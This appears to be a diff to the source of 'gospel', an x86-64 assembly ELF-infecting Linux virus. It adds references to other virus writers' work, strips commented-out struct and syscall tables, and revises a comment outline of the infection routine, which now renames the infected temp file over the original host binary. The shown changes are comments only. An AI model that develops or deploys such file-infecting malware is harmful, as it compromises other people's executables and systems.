@@ -30,11 +30,12 @@ BITS 64
 ; https://web.archive.org/web/20020207080316/http://www.big.net.au/~silvio/vit.html 
 ; (navigate to it from this page; I’m not putting the link to the tarball 
 ; here so you don't accidentally download it. yw.)
-; [13] “Skeksi virus,” elfmaster
-; https://github.com/elfmaster/skeksi_virus 
-; [14] “Linux.Nasty.asm,” TMZ, 2021, tmp.0ut, volume 1
-; https://tmpout.sh/1/Linux.Nasty.asm 
-;
+; [13] “Skeksi virus,” elfmaster, https://github.com/elfmaster/skeksi_virus 
+; [14] "Linux.Nasty.asm," TMZ, 2021, tmp.0ut, volume 1 https://tmpout.sh/1/Linux.Nasty.asm 
+; [15] "Linux.Nasty: Assembly x64 ELF virus," TMZ, 2021, https://www.guitmz.com/linux-nasty-elf-virus/ 
+; [16] Return To Original Entry Point Despite PIE", s0lden, tmp.0ut, volume 1, https://tmpout.sh/1/11.html 
+; [17] S01den and Sblip, tmp.0ut, volume 1, https://tmpout.sh/1/Linux.Kropotkine.asm   
+; [18] anansi, sad0p, https://github.com/sad0p/anansi ;
 ; ************************
 ; How to assemble gospel:
 ; ************************
@@ -110,82 +111,7 @@ BITS 64
 ; [18] anansi, sad0p, https://github.com/sad0p/anansi
 ;  
 ;*******************************************************************************
-;section	.bss
-;	struc linuxdirent
-;		.d_ino:			resq	1
-;		.d_off:			resq	1
-;		.d_reclen:		resb	2
-;		.d_nameq:		resb	1
-;		.d_type:		resb	1
-;	endstruc
-;	
-;	struc filestat
-;		.st_dev			resq	1	;IDofdevcontainingfile
-;		.st_ino			resq	1	;inode#
-;		.st_mode		resd	1	;mode
-;		.st_nlink		resd	1	;#ofhardlinks
-;		.st_uid			resd	1	;useridofowner
-;		.st_gid			resd	1	;groupIdofowner
-;		.st_rdev		resq	1	;devID
-;		.st_pad1		resq	1	;padding
-;		.st_size		resd	1	;totalsizeinbytes
-;		.st_blksize		resq	1	;blocksizeforfsi/o
-;		.st_pad2		resd	1	;padding
-;		.st_blocks		resq	1	;#of512bblocksallocated
-;		.st_atime		resq	1	;timeoflastfileaccess
-;		.st_mtime		resq	1	;timeoflastfilemod
-;		.st_ctime		resq	1	;timeoflastfilestatuschange
-;	endstruc
-;
-;	struc elf_ehdr
-;		.e_ident		resd	1		;unsignedchar
-;		.ei_class		resb	1		;
-;		.ei_data		resb	1		;
-;		.ei_version		resb	1		;
-;		.ei_osabi		resb	1		;
-;		.ei_abiversion	resb	1		;
-;		.ei_padding		resb	6		;bytes9-14
-;		.ei_nident		resb	1		;sizeofidentarray
-;		.e_type			resw	1		;uint16_t,bytes16-17
-;		.e_machine		resw	1		;uint16_t,bytes18-19
-;		.e_version		resd	1		;uint32_t, bytes 20-23
-;		.e_entry		resq	1		;ElfN_Addr, bytes 24-31
-;		.e_phoff		resq	1		;ElfN_Off, bytes 32-39
-;		.e_shoff		resq	1		;ElfN_Off, bytes 40-47
-;		.e_flags		resd	1		;uint32_t, bytes 48-51
-;		.e_ehsize		resb	2		;uint16_t, bytes 52-53
-;		.e_phentsize	resb	2		;uint16_t, bytes 54-55
-;		.e_phnum		resb	2		;uint16_t, bytes 56-57
-;		.e_shentsize	resb	2		;uint16_t, bytes 58-59
-;		.e_shnum		resb	2		;uint16_t, bytes 60-61
-;		.e_shstrndx		resb	2		;uint16_t, bytes 62-63
-;	endstruc
-
-;	struc elf_phdr
-;		.p_type			resd 1		;  uint32_t   
-;		.p_flags		resd 1		;  uint32_t   
-;		.p_offset		resq 1		;  Elf64_Off  
-;		.p_vaddr		resq 1		;  Elf64_Addr 
-;		.p_paddr		resq 1		;  Elf64_Addr 
-;		.p_filesz		resq 1		;  uint64_t   
-;		.p_memsz		resq 1		;  uint64_t   
-;		.p_align		resq 1		;  uint64_t   
-;	endstruc
-;
-;	struc elf_shdr
-;    	.sh_name		resd 1		; uint32_t   
-;    	.sh_type		resd 1		; uint32_t   
-;    	.sh_flags		resq 1		; uint64_t   
-;    	.sh_addr		resq 1		; Elf64_Addr 
-;     	.sh_offset		resq 1		; Elf64_Off  
-;     	.sh_size		resq 1		; uint64_t   
-;     	.sh_link		resd 1		; uint32_t   
-;     	.sh_info		resd 1		; uint32_t   
-;     	.sh_addralign	resq 1		; uint64_t   
-;     	.sh_entsize		resq 1		; uint64_t   
-;	endstruc
-;
-;*******************************************************************************
+; gospel stack layout:
 ; stacks on stacks on stacks on I'm doing this bc a .bss section for a virus
 ; is a nightmare to deal with
 ; so, yw,  I've written out the stack layout 4 u
@@ -268,7 +194,7 @@ BITS 64
 ; r14 + 805			.ei_data		resb	1		;
 ; r14 + 806			.ei_version		resb	1		;
 ; r14 + 807			.ei_osabi		resb	1		;
-; r14 + 808			.ei_abiversion		resb	1		;
+; r14 + 808			.ei_abiversion	resb	1		;
 ; r14 + 809			.ei_padding		resb	6		;bytes9-14
 ; r14 + 815			.ei_nident		resb	1		;sizeofidentarray
 ; r14 + 816			.e_type			resw	1		;uint16_t,bytes16-17
@@ -279,9 +205,9 @@ BITS 64
 ; r14 + 840			.e_shoff		resq	1		;ElfN_Off, bytes 40-47
 ; r14 + 848			.e_flags		resd	1		;uint32_t, bytes 48-51
 ; r14 + 852			.e_ehsize		resb	2		;uint16_t, bytes 52-53
-; r14 + 854			.e_phentsize		resb	2		;uint16_t, bytes 54-55
+; r14 + 854			.e_phentsize	resb	2		;uint16_t, bytes 54-55
 ; r14 + 856			.e_phnum		resb	2		;uint16_t, bytes 56-57
-; r14 + 858			.e_shentsize		resb	2		;uint16_t, bytes 58-59
+; r14 + 858			.e_shentsize	resb	2		;uint16_t, bytes 58-59
 ; r14 + 860			.e_shnum		resb	2		;uint16_t, bytes 60-61
 ; r14 + 862			.e_shstrndx		resb	2		;uint16_t, bytes 62-63
 ; r14 + 864		endstruc
@@ -325,26 +251,6 @@ BITS 64
 ;  r14 + 800 + elf_ehdr.e_shoff + 48	.sh_addralign	resq 1		; uint64_t   
 ;  r14 + 800 + elf_ehdr.e_shoff + 56	.sh_entsize		resq 1		; uint64_t   
 ;  r14 + 800 + elf_ehdr.e_shoff + 64	endstruc
-;*******************************************************************************
-;section .data
-;x64 syscall reference
-;
-;SYS_READ 		equ 0x0
-;SYS_WRITE 		equ 0x1
-;SYS_OPEN 		equ 0x2
-;SYS_CLOSE 		equ 0x3
-;SYS_FSTAT 		equ 0x5
-;SYS_LSEEK 		equ 0x8
-;SYS_MMAP 		equ 0x9
-;SYS_MUNMAP		equ 0xB
-;;SYS_PREAD64 	equ 0x11
-;;SYS_PWRITE64 	equ 0x12
-;;SYS_EXIT		equ 0x3c
-;SYS_FTRUNCATE	equ 0x4d
-;SYS_GETDENTS64	equ 0x4e
-;SYS_CREAT		equ 0x55
-;
-;PAGESIZE dd 4096	
 ;*******************************************************************************
 section .text
 global _start
@@ -892,10 +798,7 @@ infect:
 ;	write remaining segments [data segment to original Shdr offset] from host ELF to .xo.tmp
 ;	write modified section header table of mmap'ed host to .xo.tmp
 ;	copy (write) remaining bytes (end of SHdr table to EOF) from host ELF to .xo.tmp
-;	
-;	TODO: add routine for renaming .xo.tmp to original host file name
-;	TODO: add routine for changing permissions/owner of infected ELF to match 
-;			those of the original host file
+;	rename .xo.tmp to original host file name
 ;	close temp file
 ;	unmap file from memory
 ;
@@ -1063,5 +966,4 @@ _end:
 	xor rdi, rdi
 	mov rax, 0x3c 				;exit() syscall on x64: SYS_EXIT equ 0x3c
 	syscall	
-
 
